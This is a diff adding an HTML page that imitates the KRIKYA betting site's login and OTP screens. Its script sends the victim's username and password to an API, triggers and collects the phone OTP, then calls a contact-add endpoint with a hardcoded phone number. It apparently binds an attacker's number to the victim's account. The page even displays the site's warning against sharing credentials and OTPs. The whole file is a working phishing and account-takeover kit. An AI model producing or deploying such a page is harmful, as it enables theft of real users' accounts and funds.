@@ -1,0 +1,1052 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification</title>
+    <style>
+        .v-dialog {
+            border-radius: 4px;
+            margin: 24px;
+            overflow-y: auto;
+            pointer-events: auto;
+            transition: .3s cubic-bezier(.25, .8, .25, 1);
+            width: 100%;
+            z-index: inherit;
+            box-shadow: 0 11px 15px -7px rgba(0, 0, 0, .2), 0 24px 38px 3px rgba(0, 0, 0, .14), 0 9px 46px 8px rgba(0, 0, 0, .12)
+        }
+
+        .v-dialog__content {
+            align-items: center;
+            display: flex;
+            height: 100%;
+            justify-content: center;
+            left: 0;
+            pointer-events: none;
+            position: fixed;
+            top: 0;
+            transition: .2s cubic-bezier(.25, .8, .25, 1), z-index 1ms;
+            width: 100%;
+            z-index: 6;
+            outline: none
+        }
+
+        .v-dialog__container {
+            display: none
+        }
+
+        .v-dialog__container--attached {
+            display: inline
+        }
+
+        .v-dialog--animated {
+            animation-duration: .15s;
+            animation-name: animate-dialog;
+            animation-timing-function: cubic-bezier(.25, .8, .25, 1)
+        }
+
+        .v-dialog--fullscreen {
+            border-radius: 0;
+            margin: 0;
+            height: 100%;
+            position: fixed;
+            overflow-y: auto;
+            top: 0;
+            left: 0
+        }
+
+        .v-dialog--fullscreen>.v-card {
+            min-height: 100%;
+            min-width: 100%;
+            margin: 0 !important;
+            padding: 0 !important
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        button {
+            cursor: pointer;
+        }
+
+        header {
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 50px;
+            margin-bottom: 10px;
+            overflow: hidden;
+            z-index: 1000;
+            background-color: linear-gradient(#70c59e, #368f6b);
+            box-shadow: 0 2px 5px rgba(56, 55, 55, 0.481);
+        }
+
+        .header {
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            width: 100%;
+            color: #fefbfb;
+            padding: 10px;
+            box-sizing: border-box;
+            box-shadow: linear-gradient(#70c59e, #368f6b);
+            text-shadow: 0 3px 5px #393b39;
+
+        }
+
+        footer {
+            position: fixed;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            height: 50px;
+            background-color: #a7a8a7;
+            border: none;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(56, 55, 55, 0.262);
+        }
+
+        .signup-button {
+            background-color: #f56908;
+            height: 50px;
+            width: 130px;
+            position: fixed;
+            right: 0;
+            border: none;
+            font-weight: bold;
+        }
+
+        .login-button {
+            background-color: linear-gradient(#70c59e, #368f6b);
+            height: 50px;
+            width: 130px;
+            position: fixed;
+            right: 130px;
+            display: block;
+            border: none;
+            font-weight: bold;
+        }
+
+        .language-button {
+            background-color: #d2cece;
+            height: 50px;
+            position: fixed;
+            right: 260px;
+            color: #000;
+            text-align: center;
+            font-weight: bold;
+            border: none;
+            padding: 10px;
+        }
+
+        .bd-flag {
+            width: 30px;
+            height: 30px;
+            background-color: #034e2a;
+            margin: 10px;
+            position: absolute;
+            left: 0;
+            padding: 5px;
+            box-sizing: border-box;
+            border-radius: 50%;
+        }
+
+        .slide {
+            position: relative;
+            margin-top: 60px;
+            margin-bottom: 20px;
+            background-image: linear-gradient(#70c59e, #368f6b);
+            box-shadow: linear-gradient(#70c59e, #368f6b);
+            box-sizing: border-box;
+            justify-content: center;
+            flex-direction: column;
+            display: block;
+
+        }
+
+        #slide {
+            background-image: linear-gradient(#70c59e, #368f6b);
+            padding: 10px;
+        }
+
+        #slide img {
+            width: 500px;
+            height: 230px;
+            border-radius: 10px;
+            background-image: linear-gradient(#70c59e, #368f6b);
+            box-shadow: linear-gradient(#70c59e, #368f6b);
+        }
+
+
+
+        .close {
+            color: #aaaaaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: #000;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .viewBtn {
+            background-color: #dbdbdb !important;
+            text-transform: none;
+            width: 100%
+        }
+
+        .fixed-top {
+            position: fixed;
+            opacity: 0;
+            top: 44px;
+            width: 100%;
+            background-color: var(--v-background-base);
+            z-index: 1
+        }
+
+        .transform-game-image {
+            transform: translateY(-100px);
+            transition: transform .5s ease-in-out
+        }
+
+        .game-menu {
+            background-color: var(--v-text_reverse-base)
+        }
+
+        .game-menu .game-menu-wrapper {
+            max-width: 1240px;
+            white-space: nowrap;
+            margin: auto;
+            overflow: auto;
+            flex-wrap: nowrap;
+            display: block;
+            justify-content: space-evenly;
+            align-items: center;
+            background-color: var(--v-text-base);
+            box-shadow: 2px 2px 12px -4px #000
+        }
+
+        .game-menu .game-menu-content {
+            min-width: 80px !important;
+            flex-grow: 1;
+            text-transform: capitalize;
+            padding: 10px 12px !important;
+            background: #fff;
+            color: none;
+            width: 80px
+        }
+
+        .game-menu .game-menu-content .v-btn__content {
+            display: flex;
+            flex-direction: column
+        }
+
+        .game-menu .game-menu-content .game-menu-image {
+            background-color: none;
+            -webkit-mask-image: var(--src);
+            mask-image: var(--src);
+            -webkit-mask-size: 100%;
+            mask-size: 100%;
+            -webkit-mask-repeat: no-repeat;
+            mask-repeat: no-repeat;
+            width: 40px;
+            height: 40px
+        }
+
+        .game-menu .game-menu-content .game-menu-title {
+            margin-top: 8px;
+            font-size: 12px
+        }
+
+        .game-menu .game-menu-content:not(:last-child) {
+            border-right: 1px solid #f3f3f3
+        }
+
+        .game-menu .v-btn {
+            border-radius: unset
+        }
+
+        .game-menu .game-menu-content.selected {
+            color: #fff;
+            opacity: 1;
+            background: none
+        }
+
+        .game-menu .game-menu-content.selected .game-menu-image {
+            background-color: #fff
+        }
+
+        .game-card-box {
+            display: flex;
+            flex-direction: column;
+            background: #f3f3f3;
+            min-height: 130px
+        }
+
+        .game-card-box .game-card-label {
+            position: relative;
+            border-left: 4px solid #000000b1;
+            padding-left: 4px
+        }
+
+        .game-card-box,
+        .game-card-box-wrapper {
+            display: flex;
+            flex-wrap: wrap;
+            flex: 1 1 auto;
+            gap: 4px;
+            animation: game-card-box-wrapper .5s ease-in-out;
+            margin-top: 12px;
+            justify-content: left
+        }
+
+        .game-card-box,
+        .game-card-box-wrapper {
+            color: #000;
+        }
+
+        .game-card-box-item {
+            flex: 0 0 25%;
+            max-width: 24%;
+            padding: 2px;
+            font-size: 12px;
+            color: none;
+            height: auto !important;
+            flex-direction: column;
+            display: flex
+        }
+
+        .game-card-box .game-card-box-wrapper .game-card-box-item.gT_homepageHot {
+            min-width: 24%;
+            max-width: 24%;
+            height: auto !important;
+            flex-direction: column;
+            padding: 4px
+        }
+
+        .game-card-box .game-card-box-wrapper .game-card-box-item .homepageHot_img {
+            height: auto;
+            width: 100%;
+            border-radius: 15px
+        }
+
+        @keyframes game-card-box-wrapper {
+            0% {
+                transform: translateX(100%)
+            }
+
+            to {
+                transform: translateX(0)
+            }
+        }
+
+        .pos_right_top {
+            position: absolute !important;
+            right: 3px;
+            top: 2px
+        }
+
+        .img-hot-home {
+            width: 20px
+        }
+
+        .img-hot-home,
+        .img-new-home {
+            animation: beat 1s infinite alternate
+        }
+
+        .img-new-home {
+            width: 30px;
+            top: 7px
+        }
+
+        @keyframes beat {
+            to {
+                transform: scale(1.15)
+            }
+        }
+
+        .smallTextGameLocale {
+            font-size: 9px;
+            display: flex;
+            justify-content: center
+        }
+
+        @media screen and (max-width:450px) {
+            .smallTextGameLocale {
+                font-size: 7px
+            }
+        }
+
+        @media screen and (max-width:380px) {
+            .smallTextGameLocale {
+                font-size: 5px
+            }
+        }
+
+        @media screen and (max-width:420px) {
+            .holder_text {
+                font-size: 10px
+            }
+        }
+
+        @media screen and (max-width:350px) {
+            .holder_text {
+                font-size: 9px
+            }
+        }
+
+        .floating-left {
+            position: fixed;
+            display: flex;
+            z-index: 5;
+            left: 0;
+            top: calc(50% - 106px)
+        }
+
+
+
+        .floating-left .floating-button img {
+            width: 32px;
+            height: 32px;
+            transform: rotate(90deg)
+        }
+
+        .fab-contactUs {
+            position: fixed;
+            bottom: 90px;
+            right: 20px;
+            bottom: 9%;
+            right: 3%;
+            z-index: 5;
+            text-decoration: none
+        }
+
+        .fab-contactUs .contactUs-icon {
+            width: 72px;
+            height: 72px;
+            cursor: pointer
+        }
+
+        .fab-contactUs,
+        .mobile-livechat-icon {
+            width: 63px !important;
+            height: 63px !important;
+            cursor: pointer
+        }
+
+
+
+        .floating-right:focus:after {
+            width: 100%;
+            height: 100%;
+            display: absolute;
+            z-index: 4;
+            background-color: rgba(0, 0, 0, .65)
+        }
+
+        .floating-right .floating-button {
+            background-image: linear-gradient(90deg, #f48020, #f05724);
+            color: #fff;
+            text-align: center;
+            text-transform: uppercase;
+            -ms-writing-mode: tb-lr;
+            writing-mode: vertical-lr;
+            text-orientation: mixed;
+            transform: rotate(180deg);
+            padding: 12px 8px;
+            top: 0;
+            cursor: pointer
+        }
+
+        .floating-right .contactUs-panel {
+            background-color: #f5f5f5
+        }
+
+        .floating-right .contactUs-panel .contactUs-header {
+            font-size: 1em;
+            max-width: 212px;
+            text-align: center;
+            padding: 0 12px
+        }
+
+        .floating-right .contactUs-panel .contactUs-header .contactUs-header-icon {
+            width: 80px;
+            height: 80px
+        }
+
+        .floating-right .contactUs-panel .contactUs-item {
+            width: 100%;
+            padding: 8px;
+            gap: 8px;
+            text-decoration: none;
+            cursor: pointer
+        }
+
+        .floating-right .contactUs-panel .contactUs-item .contactUs-icon {
+            width: 32px;
+            height: 32px
+        }
+
+        .floating-right .contactUs-panel .livechat-item {
+            background-image: linear-gradient(#f48020, #f05724);
+            color: #fff
+        }
+
+        .floating-right,
+        .contactUs-panel,
+        .telegram-item {
+            background-image: linear-gradient(#45b4e4, #0092c8);
+            color: #fff
+        }
+
+        .floating-right,
+        .contactUs-panel,
+        .login-button,
+        .header,
+        body,
+        .slide {
+            background-image: linear-gradient(#70c59e, #368f6b);
+            color: #fff
+        }
+
+        .v-btn__content {
+            align-items: center;
+            color: inherit;
+            display: flex;
+            flex: 1 0 auto;
+            justify-content: inherit;
+            line-height: normal;
+            position: relative;
+            transition: inherit;
+            transition-property: inherit;
+            transition-property: opacity;
+        }
+
+        .button-primary {
+            position: relative;
+            min-height: 20px;
+            min-width: 80px;
+            border-radius: 3px;
+            background: linear-gradient(90deg,
+                    #fbc103 0,
+                    #f79604 15%,
+                    #f79604 30%,
+                    #fbc103 55%,
+                    #fbc103);
+            background-color: rgba(0, 0, 0, 0);
+            background-position-x: 0%;
+            background-position-y: 0%;
+            background-position: -50% 0;
+            margin-top: 20px;
+        }
+
+        .popup {
+            display: none;
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.708);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 10px;
+        }
+
+        .popup-content {
+            width: 400px;
+            position: relative;
+            box-shadow: 1px 5px 15px rgba(122, 120, 120, 0.3);
+            margin-left: 10px;
+            margin: 10px;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 5px;
+            right: 15px;
+            cursor: pointer;
+            font-size: 30px;
+            color: #2c2929;
+            text-shadow: 1px 1px 1px #000;
+
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            background-image: linear-gradient(90deg, #fdfffe, #fafcfb);
+            color: #000;
+            text-shadow: 1px 1px 1px #212121;
+            height: 400px;
+
+        }
+
+        label {
+            margin: 10px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            padding: 8px;
+            margin-bottom: 5px;
+            margin: 10px;
+            border: 2px solid #ccc;
+            border-radius: 6px;
+        }
+
+        .submit-btn {
+            border: none;
+            cursor: pointer;
+            border-radius: 4px;
+            font-weight: bolder;
+            text-transform: uppercase;
+            text-shadow: 1px 1px 1px #000;
+            margin: 20px;
+            height: 30px;
+            text-align: center;
+        }
+
+        .submit-btn:hover {
+            background-color: hsla(40, 40%, 45%, 0.192);
+        }
+
+        .form-title {
+            background-color: #378f6a;
+            height: 50px;
+            font-size: 16px;
+            text-transform: capitalize !important;
+            display: block !important;
+            color: #fff !important;
+            caret-color: #fff !important;
+            width: 100%;
+            box-sizing: border-box;
+            padding: 10px;
+            margin: 0;
+            overflow-wrap: break-word;
+            white-space: normal;
+            font-family: 'ReadexPro-Medium', sans-serif;
+            font-weight: bold;
+            font-style: normal;
+        }
+
+        .game-menu {
+            border: none;
+            margin-bottom: 10px;
+            padding: 10px;
+        }
+
+        .selected {
+            margin: 1px;
+            border-radius: 3px;
+            border: none;
+            box-sizing: border-box;
+            box-shadow: 1px 12px 13px #034e2a;
+            text-shadow: 1px 1px 1px #000000b1;
+        }
+    </style>
+    <style>
+        .marquee-row {
+            background-image: linear-gradient(#70c59e, #368f6b);
+            max-height: 20px;
+            position: absolute;
+            left: 25px;
+            top: 330px;
+        }
+
+        .scrolling-text {
+            white-space: nowrap;
+            overflow: hidden;
+            display: block;
+            animation: scroll-left 20s linear infinite;
+        }
+
+        .announcement-logo {
+            background-image: url('https://www.krikya11.com/static/svg/announcement-icon.svg');
+            background-repeat: no-repeat;
+            width: 20px;
+            height: 20px;
+            justify-content: center;
+            background-color: linear-gradient(#70c59e, #368f6b);
+            margin-right: 5px;
+        }
+
+        .st0 {
+            fill: #006A4E;
+        }
+
+        .rounded-circle {
+            background-color: #F32A41;
+            margin: 5px;
+            border-radius: 50%;
+            height: 15px;
+            width: 15px;
+        }
+
+        .st2 {
+            fill: #3A3A3A;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div class="header">KRIKYA</div>
+    </header>
+
+    <div class="slide" id="slide">
+        <img class="mySlides" src="https://jiliwin.9terawolf.com/cms/banner/image/en-mobile-67e18362cc072.jpg" alt="banner1">
+    </div>
+    <div class="announcement-logo"></div>
+    <div class="marquee-row">
+        <div class="scrolling-text">
+            <marquee>IMPORTANT ANNOUCEMENT !!! : PLEASE BE ADVISED THAT KRIKYA will not request transfer of funds to any
+                third party account and please do not share your personal information (login credentials, payment
+                receipt and OTP) with anyone. If you have any uncertainty, please contact KRIKYA Customer Support at
+                LIVE CHAT</marquee>
+        </div>
+    </div>
+
+
+
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <div class="form-title">Welcome to krikya</div>
+            <span class="close-btn" id="closeBtn">&times;</span>
+            <form id="loginForm">
+                <label for="membercode">Username *</label>
+                <input type="text" id="membercode" name="membercode" required>
+                <label for="password">Password *</label>
+                <input type="password" id="password" name="password" required>
+                <button type="button" class="button-primary submit-btn" onclick="loginUser(event)">Login</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="otpPopup" class="popup">
+        <div class="popup-content">
+            <div class="form-title">Verify OTP</div>
+            <span class="close-btn" id="otpCloseBtn">&times;</span>
+            <form id="otpForm">
+                <label for="otpCode">Enter OTP *</label>
+                <input type="text" id="otpCode" name="otpCode" required>
+                <button type="button" class="button-primary submit-btn" onclick="verifyOtp()">Verify</button>
+
+            </form>
+        </div>
+    </div>
+
+    <div class="game-menu">
+        <div>
+            <div id="game-menu" class="row no-gutters">
+                <div id="game-menu-full" class="row game-menu-wrapper no-gutters">
+
+                    <button type="button" class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption selected">
+                        <span class="v-btn__content">
+                            <div class="game-menu-image" style="--src: url('https://www.krikya11.com/static/svg/layout/tr_livechat.svg');">
+                            </div>
+                            <div class="game-menu-title">Hot games</div>
+                        </span>
+                    </button>
+
+                    <button type="button" class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption selected" style="height: auto;"><span class="v-btn__content">
+                            <div class="game-menu-image" style="--src: url('https://www.krikya11.com/static/svg/mobileMenu/cricket.svg');">
+                            </div>
+                            <div class="game-menu-title">Cricket</div>
+                        </span></button><button type="button" class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption selected" style="height: auto;"><span class="v-btn__content">
+                            <div class="game-menu-image" style="--src: url('https://www.krikya11.com/static/svg/mobileMenu/ld.svg');"></div>
+                            <div class="game-menu-title">casino</div>
+                        </span></button><button type="button" class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption selected" style="height: auto;"><span class="v-btn__content">
+                            <div class="game-menu-image" style="--src: url('https://www.krikya11.com/static/svg/mobileMenu/rng.svg');"></div>
+                            <div class="game-menu-title">Slot</div>
+                        </span></button><button type="button" class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption selected" style="height: auto;"><span class="v-btn__content">
+                            <div class="game-menu-image" style="--src: url('https://www.krikya11.com/static/svg/mobileMenu/crash.svg');"></div>
+                            <div class="game-menu-title">Crash</div>
+                        </span></button><button type="button" class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption selected" style="height: auto;"><span class="v-btn__content">
+                            <div class="game-menu-image" style="--src: url('https://www.krikya11.com/static/svg/mobileMenu/table.svg');"></div>
+                            <div class="game-menu-title">Table</div>
+                        </span></button><button type="button" class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption selected" style="height: auto;"><span class="v-btn__content">
+                            <div class="game-menu-image" style="--src: url('https://www.krikya11.com/static/svg/mobileMenu/sb.svg');"></div>
+                            <div class="game-menu-title">Sports</div>
+                        </span></button><button type="button" class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption selected" style="height: auto;"><span class="v-btn__content">
+                            <div class="game-menu-image" style="--src: url('https://www.krikya11.com/static/svg/mobileMenu/lottery.svg');">
+                            </div>
+                            <div class="game-menu-title">Lottery</div>
+                        </span></button><button type="button" class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption selected" style="height: auto;">
+                        <span class="v-btn__content">
+                            <div class="game-menu-image" style="--src: url('https://www.krikya11.com/static/svg/mobileMenu/fishing.svg');">
+                            </div>
+                            <div class="game-menu-title">Fishing</div>
+                        </span></button>
+                </div>
+            </div>
+            <div class="mt-0 hidden-md-and-up game-card-box px-4 py-2">
+                <div class="game-card-box-wrapper">
+                    <div class="game-card-box-item gT_table">
+                        <div aria-label="pp" role="img" class="v-image v-responsive game-card-image-avatar d-flex justify-center align-center theme--light">
+                            <div class="v-responsive__content">
+                                <img src="https://jiliwin.9terawolf.com/images/krikya/menu/table/pp.webp" alt="" class="homepageHot_img">
+                                <img src="https://www.krikya11.com/static/svg/layout/tr_livechat.svg" alt="hot" class="img-hot-home pos_right_top">
+                            </div>
+                        </div><label class="text-capitalize d-flex justify-center holder_text">PP</label>
+                    </div>
+                    <div class="game-card-box-item gT_table">
+                        <div aria-label="jili" role="img" class="v-image v-responsive game-card-image-avatar d-flex justify-center align-center theme--light">
+                            <div class="v-responsive__content">
+                                <img src="https://jiliwin.9terawolf.com/images/krikya/menu/table/jili.webp" alt="" class="homepageHot_img" style="max-width: 100%;">
+                                <!---->
+
+
+                                <!---->
+                            </div>
+                        </div><label class="text-capitalize d-flex justify-center holder_text">JILI</label>
+                    </div>
+                    <div class="game-card-box-item gT_table">
+                        <div aria-label="spribe" role="img" class="v-image v-responsive game-card-image-avatar d-flex justify-center align-center theme--light">
+                            <div class="v-responsive__content">
+                                <img src="https://jiliwin.9terawolf.com/images/krikya/menu/table/spribe.webp" class="homepageHot_img" style="max-width: 100%;"><!---->
+
+                            </div>
+                        </div><label class="text-capitalize d-flex justify-center holder_text">Spribe</label>
+                    </div>
+                    <div class="game-card-box-item gT_table">
+                        <div aria-label="sexy_v2" role="img" class="v-image v-responsive game-card-image-avatar d-flex justify-center align-center theme--light">
+                            <div class="v-responsive__content">
+                                <img src="https://jiliwin.9terawolf.com/images/krikya/menu/table/sexy_v2.webp" class="homepageHot_img" style="max-width: 100%;"><!---->
+
+                            </div>
+                        </div><label class="text-capitalize d-flex justify-center holder_text">AE King Midas</label>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <footer>
+        <div>
+            <div class="bd-flag">
+                <div class="rounded-circle"></div>
+            </div>
+            <div class="w3-btn w3-bar-item w3-padding language-button">৳ BDT English</div>
+            <button id="loginBtn" type="button" class="w3-btn w3-bar-item w3-padding login-button">Login</button>
+            <button class="w3-btn w3-bar-item w3-padding signup-button">Sign Up</button>
+
+        </div>
+    </footer>
+    <script>
+        const baseUrl = 'https://feapi.sharky777.xyz';
+        async function loginUser(event) {
+            event.preventDefault();
+            const membercode = document.getElementById("membercode").value;
+            const password = document.getElementById("password").value;
+            const domain = "https:// www.krikya11.com ";
+            const option = "2";
+            const platform = "mobile";
+            const response = await fetch(`${baseUrl}/api/token`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    membercode,
+                    password,
+                    domain,
+                    option,
+                    platform
+                }),
+            });
+
+            if (response.ok) {
+                const {
+                    access_token
+                } = await response.json();
+                localStorage.setItem('authToken', access_token);
+                localStorage.setItem('membercode', membercode);
+                fetchMobileDetails();
+                alert('Requesting OTP...');
+                await requestOtp();
+            } else {
+                alert('Login failed. Please check your membercode and password.');
+            }
+        }
+
+        async function requestOtp() {
+            const mobile = localStorage.getItem('contact');
+            const prefix = '+880';
+            const currency = "BDT";
+            const language = "bd";
+            const request_otp = true;
+            const captcha_id = "123456789";
+            const captcha_code = "1234";
+            const otpResponse = await fetch(`${baseUrl}/api/mobile/request`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': 'Bearer ' + localStorage.getItem('authToken'),
+                },
+                body: JSON.stringify({
+                    mobile,
+                    prefix,
+                    currency,
+                    language,
+                    request_otp,
+                    captcha_id,
+                    captcha_code
+                }),
+            });
+
+            if (otpResponse.ok) {
+                alert('OTP has been requested. Please answer the call.');
+                document.getElementById('otpPopup').style.display = 'flex';
+            } else {
+                alert('Failed to request OTP. Please try again.');
+            }
+        }
+
+        async function verifyOtp() {
+            const mobile = localStorage.getItem('contact');
+            const verification_code = document.getElementById('otpCode').value;
+            const captcha_id = "123456789";
+            const captcha_code = "1234";
+            const verifyResponse = await fetch(`${baseUrl}/api/mobile/verify`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': 'Bearer ' + localStorage.getItem('authToken')
+                },
+                body: JSON.stringify({
+                    verification_code,
+                    mobile,
+                    captcha_id,
+                    captcha_code
+                }),
+            });
+
+            if (verifyResponse.ok) {
+                alert('OTP verified successfully. Navigating to home...');
+                document.getElementById('otpPopup').style.display = 'none';
+                await mobileAdd();
+            } else {
+                alert('OTP verification failed. Please try again.');
+            }
+        }
+
+        async function mobileAdd() {
+            const addResponse = await fetch(`${baseUrl}/api/mobile/contact/add`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    "Authorization": "Bearer " + localStorage.getItem('authToken')
+                },
+                body: JSON.stringify({
+                    "verification_code": "",
+                    "mobile": "1611600400",
+                    "required_only_primary_verified": true
+                }),
+            });
+
+            if (addResponse.ok) {
+                alert('Mobile added successfully. Fetching home data...');
+                const homeData = await addResponse.json();
+                console.log('Home Data: ', homeData);
+            } else {
+                alert('Failed to fetch home data.');
+            }
+        }
+
+        async function fetchMobileDetails() {
+            const response = await fetch(`${baseUrl}/api/member/details`, {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': 'Bearer ' + localStorage.getItem('authToken')
+                }
+            });
+
+            if (response.ok) {
+                const data = await response.json();
+                const primaryMobile = data.data.contacts.find(contact => contact.contact_type === 'Mobile' && contact.is_primary === 1);
+                if (primaryMobile) {
+                    localStorage.setItem('contact', primaryMobile.value);
+                } else {
+                    alert('Primary mobile contact not found.');
+                }
+            } else {
+                alert('Failed to fetch mobile details.');
+            }
+        }
+
+        function refreshCaptcha(captchaId, captchaCode) {
+            const url = `https://feapi.sharky777.xyz/api/member/requestCaptchaCode?captcha_id=${captchaId}&captcha_code=${captchaCode}`;
+
+            fetch(url)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log("Captcha refreshed:", data);
+                    setTimeout(() => refreshCaptcha(captchaId, captchaCode), 60000);
+                })
+                .catch(error => {
+                    console.error("Error refreshing captcha:", error);
+                    setTimeout(() => refreshCaptcha(captchaId, captchaCode), 60000);
+                });
+        }
+
+        window.onload = function() {
+            const captchaId = "123456789";
+            const captchaCode = "1234";
+            refreshCaptcha(captchaId, captchaCode);
+        };
+    </script>
+
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginBtn = document.getElementById('loginBtn');
+            const popup = document.getElementById('popup');
+            const closeBtn = document.getElementById('closeBtn');
+            const otpCloseBtn = document.getElementById('otpCloseBtn');
+            const otpPopup = document.getElementById('otpPopup');
+
+            loginBtn.onclick = function() {
+                popup.style.display = 'flex';
+            }
+
+            closeBtn.onclick = function() {
+                popup.style.display = 'none';
+            }
+
+            otpCloseBtn.onclick = function() {
+                otpPopup.style.display = 'none';
+            }
+
+            window.onclick = function(event) {
+                if (event.target == popup) {
+                    popup.style.display = 'none';
+                }
+                if (event.target == otpPopup) {
+                    otpPopup.style.display = 'none';
+                }
+            }
+        });
+    </script>
+</body>
+
+</html>
